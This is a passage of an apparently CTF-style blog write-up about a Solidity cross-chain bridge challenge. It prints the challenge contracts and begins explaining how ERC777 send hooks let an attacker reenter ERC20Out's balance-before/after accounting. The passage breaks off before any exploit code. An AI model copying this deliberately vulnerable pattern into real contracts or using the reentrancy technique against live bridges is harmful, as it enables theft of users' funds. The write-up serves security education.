&lt;&#x2F;span&gt;&lt;span&gt;        remoteBridge[_remoteChainId] = _remoteBridge;
&lt;&#x2F;span&gt;&lt;span&gt;        remoteBridgeChainId[_remoteBridge] = _remoteChainId;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    receive() external payable virtual {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == tx.origin, &amp;quot;Only EOA&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        ethOut(msg.sender);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function ethOut(address _to) public payable virtual {
&lt;&#x2F;span&gt;&lt;span&gt;        emit ETH_transfer(_to, msg.value);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
&lt;&#x2F;span&gt;&lt;span&gt;        address _remoteBridge = remoteBridge[_remoteChainId];
&lt;&#x2F;span&gt;&lt;span&gt;        this.sendRemoteMessage{value: msg.value}(
&lt;&#x2F;span&gt;&lt;span&gt;            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ethIn.selector, _to)
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function ethIn(address _to) external payable onlyRemoteBridge {
&lt;&#x2F;span&gt;&lt;span&gt;        emit ETH_transfer(_to, msg.value);
&lt;&#x2F;span&gt;&lt;span&gt;        Address.sendValue(payable(_to), msg.value);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function ERC20Out(address _token, address _to, uint256 _amount) external {
&lt;&#x2F;span&gt;&lt;span&gt;        emit ERC20_transfer(_token, _to, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
&lt;&#x2F;span&gt;&lt;span&gt;        address _remoteBridge = remoteBridge[_remoteChainId];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (isBridgedERC20[_token]) {
&lt;&#x2F;span&gt;&lt;span&gt;            BridgedERC20(_token).burn(msg.sender, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;            _token = BridgedERC20(_token).REMOTE_TOKEN();
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 balance = IERC20(_token).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;            require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), &amp;quot;T&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;            _amount = IERC20(_token).balanceOf(address(this)) - balance;
&lt;&#x2F;span&gt;&lt;span&gt;            if (!isTokenRegisteredAtRemote[_remoteChainId][_token]) {
&lt;&#x2F;span&gt;&lt;span&gt;                this.sendRemoteMessage(
&lt;&#x2F;span&gt;&lt;span&gt;                    _remoteChainId,
&lt;&#x2F;span&gt;&lt;span&gt;                    _remoteBridge,
&lt;&#x2F;span&gt;&lt;span&gt;                    abi.encodeWithSelector(
&lt;&#x2F;span&gt;&lt;span&gt;                        Bridge.ERC20Register.selector,
&lt;&#x2F;span&gt;&lt;span&gt;                        _token,
&lt;&#x2F;span&gt;&lt;span&gt;                        IERC20Metadata(_token).name(),
&lt;&#x2F;span&gt;&lt;span&gt;                        IERC20Metadata(_token).symbol()
&lt;&#x2F;span&gt;&lt;span&gt;                    )
&lt;&#x2F;span&gt;&lt;span&gt;                );
&lt;&#x2F;span&gt;&lt;span&gt;                isTokenRegisteredAtRemote[_remoteChainId][_token] = true;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        this.sendRemoteMessage(
&lt;&#x2F;span&gt;&lt;span&gt;            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ERC20In.selector, _token, _to, _amount)
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function ERC20Register(address _remoteToken, string memory _name, string memory _symbol)
&lt;&#x2F;span&gt;&lt;span&gt;        external
&lt;&#x2F;span&gt;&lt;span&gt;        onlyRemoteBridge
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        emit ERC20_register(_remoteToken, _name, _symbol);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (remoteTokenToLocalToken[_remoteToken] == address(0)) {
&lt;&#x2F;span&gt;&lt;span&gt;            address _token = address(new BridgedERC20(msg.sender, _remoteToken, _name, _symbol));
&lt;&#x2F;span&gt;&lt;span&gt;            remoteTokenToLocalToken[_remoteToken] = _token;
&lt;&#x2F;span&gt;&lt;span&gt;            isBridgedERC20[_token] = true;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function ERC20In(address _token, address _to, uint256 _amount) external payable onlyRemoteBridge {
&lt;&#x2F;span&gt;&lt;span&gt;        emit ERC20_transfer(_token, _to, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (remoteTokenToLocalToken[_token] != address(0)) {
&lt;&#x2F;span&gt;&lt;span&gt;            BridgedERC20(remoteTokenToLocalToken[_token]).mint(_to, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            require(IERC20(_token).transfer(_to, _amount), &amp;quot;T&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function sendRemoteMessage(uint256 _targetChainId, address _targetAddress, bytes calldata _message)
&lt;&#x2F;span&gt;&lt;span&gt;        public
&lt;&#x2F;span&gt;&lt;span&gt;        payable
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == address(this), &amp;quot;S&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(_targetChainId != CHAIN_ID, &amp;quot;C&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(_targetAddress != address(0), &amp;quot;A&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        emit SendRemoteMessage(_targetChainId, _targetAddress, msg.sender, msg.value, msgNonce, _message);
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 _sourceChainId = CHAIN_ID;
&lt;&#x2F;span&gt;&lt;span&gt;        address _sourceAddress = address(this);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 h = keccak256(
&lt;&#x2F;span&gt;&lt;span&gt;            abi.encodeWithSignature(
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;relayMessage(address,uint256,address,uint256,uint256,bytes)&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;                _targetAddress,
&lt;&#x2F;span&gt;&lt;span&gt;                _sourceChainId,
&lt;&#x2F;span&gt;&lt;span&gt;                _sourceAddress,
&lt;&#x2F;span&gt;&lt;span&gt;                msg.value,
&lt;&#x2F;span&gt;&lt;span&gt;                msgNonce,
&lt;&#x2F;span&gt;&lt;span&gt;                _message
&lt;&#x2F;span&gt;&lt;span&gt;            )
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;        require(relayedMessages[h] == false, &amp;quot;H&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        relayedMessages[h] = true;
&lt;&#x2F;span&gt;&lt;span&gt;        emit RelayedMessage(h);
&lt;&#x2F;span&gt;&lt;span&gt;        relayedMessageSenderChainId = _sourceChainId;
&lt;&#x2F;span&gt;&lt;span&gt;        relayedMessageSenderAddress = _sourceAddress;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success, bytes memory result) = _targetAddress.call{value: msg.value}(_message);
&lt;&#x2F;span&gt;&lt;span&gt;        require(success, string(result));
&lt;&#x2F;span&gt;&lt;span&gt;        relayedMessageSenderChainId = 0;
&lt;&#x2F;span&gt;&lt;span&gt;        relayedMessageSenderAddress = address(0);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        unchecked {
&lt;&#x2F;span&gt;&lt;span&gt;            ++msgNonce;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Token is ERC777 {
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address user, address[] memory a) ERC777(&amp;quot;Token&amp;quot;, &amp;quot;Tok&amp;quot;, a) {
&lt;&#x2F;span&gt;&lt;span&gt;        _mint(msg.sender, 100 ether, &amp;quot;&amp;quot;, &amp;quot;&amp;quot;, false);
&lt;&#x2F;span&gt;&lt;span&gt;        _mint(user, 1 ether, &amp;quot;&amp;quot;, &amp;quot;&amp;quot;, false);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract BridgedERC20 is ERC20 {
&lt;&#x2F;span&gt;&lt;span&gt;    Bridge public immutable BRIDGE;
&lt;&#x2F;span&gt;&lt;span&gt;    Bridge public immutable REMOTE_BRIDGE;
&lt;&#x2F;span&gt;&lt;span&gt;    address public immutable REMOTE_TOKEN;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier onlyBridge() {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == address(BRIDGE), &amp;quot;B&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier onlyRemoteBridge() {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == address(BRIDGE), &amp;quot;RB1&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(
&lt;&#x2F;span&gt;&lt;span&gt;            REMOTE_BRIDGE.relayedMessageSenderChainId() != 0
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;amp;&amp;amp; BRIDGE.remoteBridgeChainId(REMOTE_BRIDGE.relayedMessageSenderAddress()) == REMOTE_BRIDGE.relayedMessageSenderChainId(),
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;quot;RB2&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _remoteBridge, address _remoteToken, string memory _name, string memory _symbol) ERC20(_name, _symbol) {
&lt;&#x2F;span&gt;&lt;span&gt;        BRIDGE = Bridge(payable(msg.sender));
&lt;&#x2F;span&gt;&lt;span&gt;        REMOTE_BRIDGE = Bridge(payable(_remoteBridge));
&lt;&#x2F;span&gt;&lt;span&gt;        REMOTE_TOKEN = _remoteToken;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function mint(address _to, uint256 _amount) external onlyRemoteBridge {
&lt;&#x2F;span&gt;&lt;span&gt;        _mint(_to, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function burn(address _from, uint256 _amount) external onlyBridge {
&lt;&#x2F;span&gt;&lt;span&gt;        _burn(_from, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;solution-6&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-6&quot; aria-label=&quot;Anchor link for: solution-6&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Yes man, bridges.. More interesting and I personally I love bridges. Let&#x27;s do this as quick as possible.&lt;&#x2F;p&gt;
&lt;p&gt;Lets, break down the Bridge protocol.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Bridge (Main Contract)&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Handles cross-chain messaging and token transfers&lt;&#x2F;li&gt;
&lt;li&gt;Manages remote bridge registrations and token registrations&lt;&#x2F;li&gt;
&lt;li&gt;Key functions:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ethOut&#x2F;ethIn&lt;&#x2F;code&gt;: Handles ETH transfers between chains&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;ERC20Out&#x2F;ERC20In&lt;&#x2F;code&gt;: Handles ERC20 token transfers&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;ERC20Register&lt;&#x2F;code&gt;: Registers new tokens on remote chains&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;sendRemoteMessage&lt;&#x2F;code&gt;: Core function for sending messages between chains&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;BridgedERC20&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Special ERC20 token for cross-chain transfers&lt;&#x2F;li&gt;
&lt;li&gt;Can only be minted by remote bridge and burned by local bridge&lt;&#x2F;li&gt;
&lt;li&gt;Tracks the remote token address and bridge contracts&lt;&#x2F;li&gt;
&lt;li&gt;Implements strict access controls for minting&#x2F;burning&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Token&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Simple ERC777 token used in the challenge&lt;&#x2F;li&gt;
&lt;li&gt;Mints initial tokens to deployer and user&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;This is not a complete bridge protocol because there is no off-chain componets like relayers, etc. But all the things were replicated in the smart contract itself.
Because of this it&#x27;s confusing to understand which one is source contract and which one is destination contract.&lt;&#x2F;p&gt;
&lt;p&gt;Just follow me, &lt;code&gt;remoteBridge&lt;&#x2F;code&gt; means destination bridge, &lt;code&gt;ethOut()&lt;&#x2F;code&gt; or &lt;code&gt;ERC20Out()&lt;&#x2F;code&gt; means that the source contract is sending to destination contract.
&lt;code&gt;ethIn()&lt;&#x2F;code&gt; or &lt;code&gt;ERC20In()&lt;&#x2F;code&gt; are the functions which usually called by off-chain components like relayer but here the source contract directly calls these functions on destination contract. Here &lt;code&gt;ethIn()&lt;&#x2F;code&gt; or &lt;code&gt;ERC20In()&lt;&#x2F;code&gt; are restricted to be only calleable by the remote bridge.
&lt;code&gt;ERC20Register()&lt;&#x2F;code&gt; is to deploy a equivalent token (wrapped) on the destination for a token on source chain. Here, If the token was not registered the on the first bridging of that token the registration and the deployment of wrapped token will be done automatically.
The wrapped token which is going to be deployed for a token on source chain is &lt;code&gt;BridgedERC20&lt;&#x2F;code&gt; token. Token we are going to bridge is &lt;code&gt;Token&lt;&#x2F;code&gt; an &lt;code&gt;ERC777&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Usually asset moving bridges will follow following modes of bridging.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Lock&lt;&#x2F;strong&gt; asset on source chain then &lt;strong&gt;Mint&lt;&#x2F;strong&gt; a wrapped asset on destination&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Burn&lt;&#x2F;strong&gt; and &lt;strong&gt;Mint&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Lock&lt;&#x2F;strong&gt; and &lt;strong&gt;Release&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Burn&lt;&#x2F;strong&gt; and &lt;strong&gt;Mint&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Here in this protocol the &lt;strong&gt;Lock&lt;&#x2F;strong&gt; and &lt;strong&gt;Mint&lt;&#x2F;strong&gt; in forward direction and when the same Wrapped token bridged back to source then the &lt;strong&gt;Burn&lt;&#x2F;strong&gt; and &lt;strong&gt;Release&lt;&#x2F;strong&gt; happens. (I&#x27;d love to explain all these in a dedicated blog post)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;sendRemoteMessage()&lt;&#x2F;code&gt; function will log a message to be picked up by the off-chain relayer and send it to destination. But here all this relayer functionality was implemented in this function itself.
It was restricted to be calling from by anyone else except the same contract functions with the following check. If this check was not there
we could&#x27;ve simply call this to perform an attack. But no luck, we can&#x27;t do this.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;require(msg.sender == address(this), &amp;quot;S&amp;quot;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;But the &lt;code&gt;sendRemoteMessage()&lt;&#x2F;code&gt; function is called by the &lt;code&gt;ethOut()&lt;&#x2F;code&gt; or &lt;code&gt;ERC20Out()&lt;&#x2F;code&gt; and then the call goes to &lt;code&gt;ethIn()&lt;&#x2F;code&gt; or &lt;code&gt;ERC20In()&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;USER -&amp;gt; ethOut()&#x2F;ERC20Out()  -&amp;gt; sendRemoteMessage() -&amp;gt; ethIn()&#x2F;ERC20In() -&amp;gt; USER (mint&#x2F;release tokens)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Let&#x27;s get the initial state of the protocol,&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Bridge:&lt;&#x2F;span&gt;&lt;span&gt;  0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;FLAG_TOKEN:&lt;&#x2F;span&gt;&lt;span&gt;  0x7a072D0a5C338679Da17C4922C364c03167D1fB2 (ERC777)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Player&lt;&#x2F;span&gt;&lt;span&gt; balance of FLAG :  1000000000000000000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;SOURCE&lt;&#x2F;span&gt;&lt;span&gt; Bridge balance of FLAG :  100000000000000000000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;SOURCE&lt;&#x2F;span&gt;&lt;span&gt; CHAIN_ID :  1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Total&lt;&#x2F;span&gt;&lt;span&gt; Default operators of FLAG :  0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;REMOTE&lt;&#x2F;span&gt;&lt;span&gt; CHAIN_ID :  2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;REMOTE&lt;&#x2F;span&gt;&lt;span&gt; Bridge:  0xd73fFbbd87624b59e166717676F0e10135C9fe3B
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;REMOTE&lt;&#x2F;span&gt;&lt;span&gt; Bridge balance:  0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Expected initial data..&lt;&#x2F;p&gt;
&lt;p&gt;How can we bridge the &lt;code&gt;1e18&lt;&#x2F;code&gt; of ERC777 Token that we got? By calling &lt;code&gt;ERC20Out()&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function ERC20Out(address _token, address _to, uint256 _amount) external {
&lt;&#x2F;span&gt;&lt;span&gt;        emit ERC20_transfer(_token, _to, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
&lt;&#x2F;span&gt;&lt;span&gt;        address _remoteBridge = remoteBridge[_remoteChainId];
&lt;&#x2F;span&gt;&lt;span&gt;        if (isBridgedERC20[_token]) {
&lt;&#x2F;span&gt;&lt;span&gt;            BridgedERC20(_token).burn(msg.sender, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;            _token = BridgedERC20(_token).REMOTE_TOKEN();
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 balance = IERC20(_token).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;            require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), &amp;quot;T&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;            _amount = IERC20(_token).balanceOf(address(this)) - balance;
&lt;&#x2F;span&gt;&lt;span&gt;            if (!isTokenRegisteredAtRemote[_remoteChainId][_token]) {
&lt;&#x2F;span&gt;&lt;span&gt;                this.sendRemoteMessage(
&lt;&#x2F;span&gt;&lt;span&gt;                    _remoteChainId,
&lt;&#x2F;span&gt;&lt;span&gt;                    _remoteBridge,
&lt;&#x2F;span&gt;&lt;span&gt;                    abi.encodeWithSelector(
&lt;&#x2F;span&gt;&lt;span&gt;                        Bridge.ERC20Register.selector,
&lt;&#x2F;span&gt;&lt;span&gt;                        _token,
&lt;&#x2F;span&gt;&lt;span&gt;                        IERC20Metadata(_token).name(),
&lt;&#x2F;span&gt;&lt;span&gt;                        IERC20Metadata(_token).symbol()
&lt;&#x2F;span&gt;&lt;span&gt;                    )
&lt;&#x2F;span&gt;&lt;span&gt;                );
&lt;&#x2F;span&gt;&lt;span&gt;                isTokenRegisteredAtRemote[_remoteChainId][_token] = true;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        this.sendRemoteMessage(
&lt;&#x2F;span&gt;&lt;span&gt;            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ERC20In.selector, _token, _to, _amount)
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Observing the above function, if the token that we are sending is &lt;code&gt;BridgedERC20&lt;&#x2F;code&gt; then the burn happens. If not the lock happens. Nothing exciting in the if block.
But in the else block the lock of our token happens (ERC777).&lt;&#x2F;p&gt;
&lt;p&gt;Can you see the problem of these three lines???&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;uint256 balance = IERC20(_token).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), &amp;quot;T&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;_amount = IERC20(_token).balanceOf(address(this)) - balance;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I can see it.. The &lt;code&gt;balance&lt;&#x2F;code&gt; is fetched on line 1 then same balance is used after the &lt;code&gt;trnasferFrom()&lt;&#x2F;code&gt; call. What is anybody can &lt;strong&gt;reenter&lt;&#x2F;strong&gt; from that transferFrom call?? With standard ERC20 token transfers it&#x27;s not possible.
But it is possible from the &lt;code&gt;ERC777&lt;&#x2F;code&gt; transfers bacause of an extra feature called Hooks and Callbacks.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;&quot;Hooks in ERC777 tokens serve as entry points for custom code execution during token transfers. They allow external smart contracts to intervene in the token transfer process, either before or after the transfer occurs. This flexibility is a double-edged sword, as it can be used for legitimate purposes but also exploited for malicious actions.&quot;&lt;&#x2F;em&gt; - Johny&lt;&#x2F;p&gt;
&lt;h3 id=&quot;erc777&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#erc777&quot; aria-label=&quot;Anchor link for: erc777&quot;&gt;ERC777&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;The following are the functions of ERC777 standard. In the &lt;code&gt;transferFrom()&lt;&#x2F;code&gt; the contract will call the
&lt;code&gt;_send()&lt;&#x2F;code&gt; hook, there in the hook if the sender is registered a &lt;code&gt;IERC777Sender&lt;&#x2F;code&gt; interface implementer in the &lt;code&gt;_ERC1820_REGISTRY&lt;&#x2F;code&gt; contract then the hook will call the &lt;code&gt;tokensToSend()&lt;&#x2F;code&gt; function on the implementor. Here the user is the sender but the implementor is someother contract registered by the user as his &lt;code&gt;IERC777Sender&lt;&#x2F;code&gt; implementor. Look at the following control flow for better understanding.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;User -&amp;gt; Deploys a contract -&amp;gt; Declares the contract as willing to be an implementer 
&lt;&#x2F;span&gt;&lt;span&gt;User -&amp;gt; transferFrom() -&amp;gt; _send() -&amp;gt; _callTokensToSend() -&amp;gt; user Implementor.tokensToSend()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Okay, enough reconnaissance. Now we know the it is possible to reenter to back to the &lt;code&gt;ERC20Out()&lt;&#x2F;code&gt; function with callback hooks of &lt;code&gt;ERC777&lt;&#x2F;code&gt; via the &lt;code&gt;ERC-1820 registry&lt;&#x2F;code&gt;,&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;    function transferFrom(
&lt;&#x2F;span&gt;&lt;span&gt;        address holder,
&lt;&#x2F;span&gt;&lt;span&gt;        address recipient,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount
&lt;&#x2F;span&gt;&lt;span&gt;    ) public virtual override returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        address spender = _msgSender();
&lt;&#x2F;span&gt;&lt;span&gt;        _spendAllowance(holder, spender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;        _send(holder, recipient, amount, &amp;quot;&amp;quot;, &amp;quot;&amp;quot;, false);
&lt;&#x2F;span&gt;&lt;span&gt;        return true;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function _send(
&lt;&#x2F;span&gt;&lt;span&gt;        address from,
&lt;&#x2F;span&gt;&lt;span&gt;        address to,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount,
&lt;&#x2F;span&gt;&lt;span&gt;        bytes memory userData,
&lt;&#x2F;span&gt;&lt;span&gt;        bytes memory operatorData,
&lt;&#x2F;span&gt;&lt;span&gt;        bool requireReceptionAck
&lt;&#x2F;span&gt;&lt;span&gt;    ) internal virtual {
&lt;&#x2F;span&gt;&lt;span&gt;        require(from != address(0), &amp;quot;ERC777: transfer from the zero address&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(to != address(0), &amp;quot;ERC777: transfer to the zero address&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        address operator = _msgSender();
&lt;&#x2F;span&gt;&lt;span&gt;
